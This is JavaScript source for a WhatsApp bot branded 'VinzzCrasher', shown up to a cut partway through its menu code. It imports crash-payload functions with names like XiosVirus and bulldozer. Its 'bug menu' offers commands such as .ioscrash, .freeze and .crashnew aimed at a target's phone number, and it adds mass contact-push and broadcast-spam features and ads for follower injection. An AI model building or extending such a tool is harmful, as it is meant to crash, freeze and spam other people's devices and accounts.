module.exports = async (vinzzoffc, m, store) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const { Client } = require('ssh2');
const JsConfuser = require('js-confuser');
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const from = m.key.remoteJid
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await vinzzoffc.decodeJid(vinzzoffc.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const kontol = m.key.fromMe ? (vinzzoffc.user.id.split(':')[0]+'@s.whatsapp.net' || vinzzoffc.user.id) : (m.key.participant || m.key.remoteJid)
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await vinzzoffc.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const isOwner = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isAcces = (m && m.sender && [botNumber, ...global.premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const groupName = m.isGroup ? groupMetadata.subject : "";
const isMedia = /image|video|sticker|audio/.test(mime);
const { getRandom, getBuffer, tanggal, toAudio, toPTT, toVideo, ffmpeg, makeStickerFromUrl, hariini, vinzztotalpitur, lampumerah, loli, protoxaudio, freezekamoflase, newgalaxy, buginvite, QXIphone, QDIphone, XiosVirus, protocolbug7, bulldozer, protocolbug8, PayloadExtended, PayloadExtended2 } = require("../Memory/#Vinzz-Sigma.js")

// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#00FF00").bold(`=> Ada Pesan Baru!...:`));
console.log(
chalk.bgHex("#e74c3c").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${cmd} \n` +
` ├─ > Pengirim: ${pushname} \n` +
` ╰─ > JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#e74c3c").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
)
);
}
console.log();
} 

const contol = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `@${pushname}\nCommand : ${cmd}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=${senderNumber}:${senderNumber}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const proxy = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: 'Vinzz-Slayer Mode Push',jpegThumbnail: ""}}}

const reply = (teks) => { 
vinzzoffc.sendMessage(from, { text: teks, contextInfo: { 
externalAdReply : { 
showAdAttribution : true,  
title : "VinzzCrasher",
body : "® ᴘᴏᴡᴇʀ ʙʏ ᴠɪɴᴢᴢ",
containsAutoReply : true, 
mediaType : 1, 
thumbnailUrl : 'https://files.catbox.moe/4szg67.webp', 
mediaUrl : 'https://files.catbox.moe/4szg67.webp', 
sourceUrl : "https://VinzzOfficial.my.id" }}}, { quoted: loli }) }

const VinzzReply = (teks) => { 
vinzzoffc.sendMessage(from, { text: teks, contextInfo: { 
externalAdReply : { 
showAdAttribution : true,  
title : "🩸⃟VinzzOfficial", 
body : "⚡⃝⃝Vinzz-Developer",
containsAutoReply : true, 
mediaType : 1, 
thumbnailUrl : 'https://a.top4top.io/p_3427muo5c0.jpg', 
mediaUrl : 'https://a.top4top.io/p_3427muo5c0.jpg', 
sourceUrl : `https://${hariini}` }}}, { quoted: contol }) }

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/zqueq8.jpg" } }, { upload: vinzzoffc.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*VinzzOfficial* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*VinzzOfficial Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp3.000

* Ram 2 GB : Rp4.000

* Ram 3 GB : Rp5.000

* Ram 4 GB : Rp6.000

* Ram 5 GB : Rp7.000

* Ram 6 GB : Rp8.000

* Ram 7 GB : Rp9.000

* Ram 8 GB : Rp10.000

* Ram 9 GB : Rp11.000

* Ram 10 GB : Rp12.000

* Ram Unlimited : Rp13.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`,
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `\`LIST VPS DIGITAL OCEHAN BY VINZZ\`

* 🚀 RAM 1GB CORE 1 : => *20K* <=
* 🚀 RAM 2GB CORE 1 : => *25K* <=
* 🚀 RAM 2GB CORE 2 : => *30K* <=
* 🚀 RAM 4GB CORE 2 : => *40K* <=
* 🚀 RAM 8GB CORE 4 : => *50K* <=
* 🚀 RAM 16GB CORE 4 : => *70k* <=

=> *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=> *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_* <=

\`Bonus Buy Vps\`
- Free Install Panel 1x
- Free Instal Wings/Node 1x
- Free Pasang Egg Bot/Mc
- Free Install Thema Buy Ram 8/16
- Garansi 15 Hari Nego? = Nogar
- Vps On 20 - 30 Hari 
- Garansi Hanya 1x Ambil

\`MINAT? CONTACT DI BAWAH\`
* NOMOR : wa.me//6285218951518

*JIKA DI SINI SLOWRES LANGSUNG BUH NO DI ATAS*

\`SALURAN VINZZ REAL\`
* https://whatsapp.com/channel/0029Var9lmyLCoX4cLSt1Q3U`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: proxy})
await vinzzoffc.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

// Fungsi Delay Loading
const wow = (ms) => new Promise(resolve => setTimeout(resolve, ms));
// Edit? Semoga Eror!
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

async function loading(vinzzoffc, from) {
    var loadingSteps = [
        "⌛10%",
        "⏳30%",
        "⌛50%",
        "⏳80%",
        "⌛100%",
        "_ʙᴏᴛᴢ ᴠɪɴᴢᴢ sᴜᴄᴄᴇs_"
    ];

    let { key } = await vinzzoffc.sendMessage(from, { text: 'menampilkan menu. . .' }); // Mengirim pesan awal

    for (let i = 0; i < loadingSteps.length; i++) {
        await delay(1000); // Delay 1 detik agar terlihat progresif
        await vinzzoffc.sendMessage(from, { text: loadingSteps[i], edit: key }); // Mengedit pesan sebelumnya
    }
}

switch (command) {

case "menu": case "vinzz": {
let menu = ` *👋 i am bot private created by Vinzz hosting to help add audience to your whatsapp status. please follow the developer channel immediately.*

\`⪻⚡ ⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞ ⪼\`
https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V
thank you for following the owner's channel. 

to display all menu please type 
 *.allmenu*  or *.pushmenu*
 *.bugmenu* or *.panelmenu*

💋 thank you for using this bot, don't forget to follow the channel above >,<
`
await vinzzoffc.sendMessage(m.chat, {
video: { url: "https://files.catbox.moe/ysvq2o.mp4" },
gifPlayback: true,   
caption: menu
        },{
quoted: contol})
             
await vinzzoffc.sendMessage(m.chat, {audio: { url: "https://files.catbox.moe/x0rhmj.mp3" },mimetype: 'audio/mpeg',ptt: true}, {quoted:m})};
break
case "allmenu": {
await loading(vinzzoffc, from);
let allmenu = `
\`I N F O R M A T I O N\`
  • Pemilik : VinzzOfficial
  • Version : 1.0.0
  • Mode : ${vinzzoffc.public ? "Public" : "Self"}
  • Status : free
  • Action : ẉ.ceo/VinzzOfficial
  
  \`ー BUG MENU ー\`
  • .hardbug ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .buldohd ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .invisible ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .fcinvis ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .hardproto ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼

  \`ー PUSH MENU ー\`
  • .pushkontak
  • .pushkontak1
  • .pushkontak2
  • .pushkontak3
  • .savekontak
  • .savekontak2
  • .save ( private )
  • .listgc
  • .idgc
  
  \`ー SHARE MENU ー\`
  • .jpm 
  • .jpm2 
  • .jpmtesti 
  • .jpmhidetag
  • .jpmpoll
  • .startjpm
  • .setteksjpm
  • .teksjpm
  • .jpmslide

  \`ー MENU CRATE PANELー\`
  • .1gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .2gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .3gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .4gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .5gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .6gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .7gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .8gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .9gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .10gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .unli ⪻ *𝐮𝐬𝐞𝐫* ⪼

\` MENU CRATE PANELV2 \`
  • .1gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .2gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .3gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .4gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .5gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .6gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .7gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .8gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .9gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .10gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .unliv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  
  \`ー ALL MENU CPANEL ー\`
  • .delsrv ⪻ *𝐢𝐝* ⪼
  • .delusr ⪻ *𝐢𝐝* ⪼
  • .delpanel ⪻ *𝐢𝐝* ⪼
  • .listusr 
  • .listsrv 
  • .clearsrv 
  • .startwings 
  • .toadmin ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .toowner ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .topartner ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .installpanel
  • .uninstallpanel 
  • .installtemastellar
  • .uninstalltema
  • .hackbackpanel 
  • .domain
  • .subdomain 
  • .domainmenu 
  • .1gb - unli / v2 

  \`ー MENU LAINYA ー\`
  • .public
  • .self
  • .close
  • .open
  • .promote
  • .demote
  • .leave
  • .hidetag
  • .kick
  • .deploy
  • .cekidch/cekidgc
  • .welcome on/off
  • .autoread on/off
  • .anticall on/off
  
  \`ー FUN MENU ー\`
  • .tourl
  • .sticker
  • .rvo
  • .tohd
  • .toimage
  • .enc/enchard
  
\`⪻⚡ ⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞ ⪼\`
https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V
`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Cek Featur",
    sections: [
      {
        title: `🤖 Silah Kan Pilih Menu`, 
        highlight_label: `Attack WhatsApp`,
        rows: [
          {
            header: "⎋ Bug menu",
            title: "Menampilkan menu bug",
            description: "© By Vinzz",
            id: `.bugmenu`, 
          },
        ]},
        {
        title: `🔐Akses fitur owner`, 
        highlight_label: `Acces Bot`,
        rows: [
          {
            header: "⎋ Menu owner",
            title: "Menampilkan menu owner",
            description: "© By Vinzz",
            id: `.pushmenu`, 
          },
        ]},
        {
        title: `💻 panel menu`, 
        highlight_label: `Menu Panel`,
        rows: [
          {
            header: "⎋ Panel Menu",
            title: "Menampilkan Panel Menu",
            description: "© By Vinzz",
            id: `.panelmenu`, 
          },
        ]},
        {
        title: `🪀Report jika terjadi eror`, 
        highlight_label: `Rekomendasi`,
        rows: [
          {
            header: "⎋ Report Ke Owner",
            title: "Laporan Eror Ke Owner",
            description: "© By Vinzz",
            id: `.Report`, 
          },
        ]},
        {
        title: `🔥 Thank To`, 
        highlight_label: `Opsional`,
        rows: [
          {
            header: "⎋ VinzzOfficial",
            title: "Menampilkan Thank Tho",
            description: "© By Vinzz",
            id: `.tqto`,      
          },
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
video: { url: "https://files.catbox.moe/ysvq2o.mp4" },
	    gifPlayback: false,
        caption: allmenu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Crasher`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: contol
})

await vinzzoffc.sendMessage(m.chat, {audio: { url: "https://files.catbox.moe/x0rhmj.mp3" },mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}

break
case "panelmenu": {
await loading(vinzzoffc, from);
let menupanel = `
\`I N F O R M A T I O N\`
  • Pemilik : VinzzOfficial
  • Version : 1.0.0
  • Mode : ${vinzzoffc.public ? "Public" : "Self"}
  • Status : free
  • Action : ẉ.ceo/VinzzOfficial
                   
  \`ー PANEL MENU ー\`
  • .1gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .2gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .3gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .4gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .5gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .6gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .7gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .8gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .9gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .10gb ⪻ *𝐮𝐬𝐞𝐫* ⪼
  • .unli ⪻ *𝐮𝐬𝐞𝐫* ⪼
  
\`ー MENU CRATE PANELV2 ー\`
  • .1gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .2gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .3gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .4gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .5gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .6gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .7gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .8gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .9gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .10gbv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .unliv2 ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼

  \`ー ALL MENU CPANEL ー\`
  • .delsrv ⪻ *𝐢𝐝* ⪼
  • .delusr ⪻ *𝐢𝐝* ⪼
  • .delpanel ⪻ *𝐢𝐝* ⪼
  • .listusr 
  • .listsrv 
  • .clearsrv 
  • .startwings 
  • .toadmin ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .toowner ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .topartner ⪻ *𝐮𝐬𝐞𝐫,𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .installpanel
  • .uninstallpanel 
  • .installtemastellar
  • .uninstalltema
  • .hackbackpanel 
  • .domain
  • .subdomain 
  • .domainmenu 
  • .1gb - unli / v2

  \`ー MENU LAINYA ー\`
  • .public
  • .self
  • .close
  • .open
  • .promote
  • .demote
  • .leave
  • .hidetag
  • .kick
  • .deploy
  • .cekidch/cekidgc
  
\`⪻⚡ ⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞ ⪼\`
https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V
`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Cek Featur",
    sections: [
      {
        title: `🤖 Silah Kan Pilih Menu`, 
        highlight_label: `Attack WhatsApp`,
        rows: [
          {
            header: "⎋ Bug menu",
            title: "Menampilkan menu bug",
            description: "© By Vinzz",
            id: `.bugmenu`, 
          },
        ]},
        {
        title: `🔐Akses fitur owner`, 
        highlight_label: `Acces Bot`,
        rows: [
          {
            header: "⎋ Menu owner",
            title: "Menampilkan menu owner",
            description: "© By Vinzz",
            id: `.pushmenu`, 
          },
        ]},
        {
        title: `💻 panel menu`, 
        highlight_label: `Menu Panel`,
        rows: [
          {
            header: "⎋ Panel Menu",
            title: "Menampilkan Panel Menu",
            description: "© By Vinzz",
            id: `.panelmenu`, 
          },
        ]},
        {
        title: `🪀Report jika terjadi eror`, 
        highlight_label: `Rekomendasi`,
        rows: [
          {
            header: "⎋ Report Ke Owner",
            title: "Laporan Eror Ke Owner",
            description: "© By Vinzz",
            id: `.Report`, 
          },
        ]},
        {
        title: `🔥 Thank To`, 
        highlight_label: `Opsional`,
        rows: [
          {
            header: "⎋ VinzzOfficial",
            title: "Menampilkan Thank Tho",
            description: "© By Vinzz",
            id: `.tqto`,      
          },
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
video: { url: "https://files.catbox.moe/ysvq2o.mp4" },
	    gifPlayback: false,
        caption: menupanel,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Crasher`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: contol
})

await vinzzoffc.sendMessage(m.chat, {audio: { url: "https://files.catbox.moe/x0rhmj.mp3" },mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}

break
case "pushmenu":  {
await loading(vinzzoffc, from);
let menuowner = `
\`I N F O R M A T I O N\`
  • Pemilik : VinzzOfficial
  • Version : 1.0.0
  • Mode : ${vinzzoffc.public ? "Public" : "Self"}
  • Status : free
  • Action : ẉ.ceo/VinzzOfficial    

  \`ー PUSH MENU ー\`
  • .pushkontak
  • .pushkontak1
  • .pushkontak2
  • .pushkontak3
  • .savekontak
  • .savekontak2
  • .save ( private )
  • .listgc
  • .idgc
  
  \`ー SHARE MENU ー\`
  • .jpm 
  • .jpm2 
  • .jpmtesti 
  • .jpmhidetag
  • .jpmpoll
  • .startjpm
  • .setteksjpm
  • .teksjpm
  • .jpmslide

\`⪻⚡ ⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞ ⪼\`
https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V
`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Cek Featur",
    sections: [
      {
        title: `🤖 Silah Kan Pilih Menu`, 
        highlight_label: `Attack WhatsApp`,
        rows: [
          {
            header: "⎋ Bug menu",
            title: "Menampilkan menu bug",
            description: "© By Vinzz",
            id: `.bugmenu`, 
          },
        ]},
        {
        title: `🔐Akses fitur owner`, 
        highlight_label: `Acces Bot`,
        rows: [
          {
            header: "⎋ Menu owner",
            title: "Menampilkan menu owner",
            description: "© By Vinzz",
            id: `.pushmenu`, 
          },
        ]},
        {
        title: `💻 panel menu`, 
        highlight_label: `Menu Panel`,
        rows: [
          {
            header: "⎋ Panel Menu",
            title: "Menampilkan Panel Menu",
            description: "© By Vinzz",
            id: `.panelmenu`, 
          },
        ]},
        {
        title: `🪀Report jika terjadi eror`, 
        highlight_label: `Rekomendasi`,
        rows: [
          {
            header: "⎋ Report Ke Owner",
            title: "Laporan Eror Ke Owner",
            description: "© By Vinzz",
            id: `.Report`, 
          },
        ]},
        {
        title: `🔥 Thank To`, 
        highlight_label: `Opsional`,
        rows: [
          {
            header: "⎋ VinzzOfficial",
            title: "Menampilkan Thank Tho",
            description: "© By Vinzz",
            id: `.tqto`,      
          },
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
video: { url: "https://files.catbox.moe/ysvq2o.mp4" },
	    gifPlayback: false,
        caption: menuowner,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Crasher`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: contol
})

await vinzzoffc.sendMessage(m.chat, {audio: { url: "https://files.catbox.moe/x0rhmj.mp3" },mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}

break
case "bugmenu":  {
await loading(vinzzoffc, from);
let menubug = `
\`I N F O R M A T I O N\`
  • Pemilik : VinzzOfficial
  • Mode : ${vinzzoffc.public ? "Public" : "Self"}
  • Status : Private
  • Action : ẉ.ceo/VinzzOfficial
                   

  \`ー BUG MENU ー\`
  • .crashnew ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .buldohd ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .hardproto ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .ioscrash ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .ui-system ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .blanknew ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .iosstuck ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .crashv2 ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .uicrash ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .freeze ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .stuck ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .vinzzhard ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .vinzzcrash ⪻ *𝐧𝐮𝐦𝐛𝐞𝐫* ⪼
  • .hardbug ⪻ *𝐫𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐬𝐢* ⪼
  
  \`ー MENU LAINYA ー\`
  • .public
  • .self
  • .close
  • .open
  • .promote
  • .demote
  • .leave
  • .hidetag
  • .kick
  • .deploy
  • .cekidch/cekidgc
  
\`⪻⚡ ⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞ ⪼\`
https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V
`
const flowActions = [
{
buttonId: `.owner`,
buttonText: {
displayText: 'owner'
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "Cek Featur",
    sections: [
      {
        title: `🤖 Silah Kan Pilih Menu`, 
        highlight_label: `Attack WhatsApp`,
        rows: [
          {
            header: "⎋ Bug menu",
            title: "Menampilkan menu bug",
            description: "© By Vinzz",
            id: `.bugmenu`, 
          },
        ]},
        {
        title: `🔐Akses fitur owner`, 
        highlight_label: `Acces Bot`,
        rows: [
          {
